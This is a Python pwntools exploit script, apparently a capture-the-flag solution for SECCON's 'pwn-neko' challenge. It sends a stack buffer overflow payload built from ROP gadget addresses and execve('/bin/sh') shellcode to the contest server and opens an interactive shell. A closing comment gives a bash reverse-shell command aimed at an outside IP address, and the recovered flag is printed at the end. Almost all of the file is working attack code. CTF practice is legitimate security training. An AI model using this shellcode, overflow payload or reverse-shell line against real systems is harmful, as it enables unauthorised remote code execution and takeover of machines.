from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


gdbscript = '''
gef
# b main
b *0x400707
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn-neko.chal.seccon.jp', 9001)

# input()

io.recvuntil(b'!\n')


addr_ret = 0x0000000000400566
addr_pop5_ret = 0x00000000004007db

shellcode_main = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode_main = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'
shellcode = b'\x90' * (0x28 - len(shellcode_main)) + shellcode_main

assert len(shellcode) == 0x28

payload = b''
payload += b'A' * 0x28
payload += p64(addr_ret) * 0x2
payload += p64(addr_pop5_ret)
payload += shellcode
payload += p64(addr_pop5_ret)
payload += shellcode
payload += p64(addr_pop5_ret)
payload += shellcode
payload += p64(addr_ret) * 0x3
payload += b'\n'  # add new line at the end to NULL overwrite the address on stack

io.sendline(payload)
# io.sendline(b'a')

io.interactive()

# after interactive first execute `/bin/bash`
# then execute `bash -i >& /dev/tcp/153.126.161.91/9999 0>&1`


# SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}
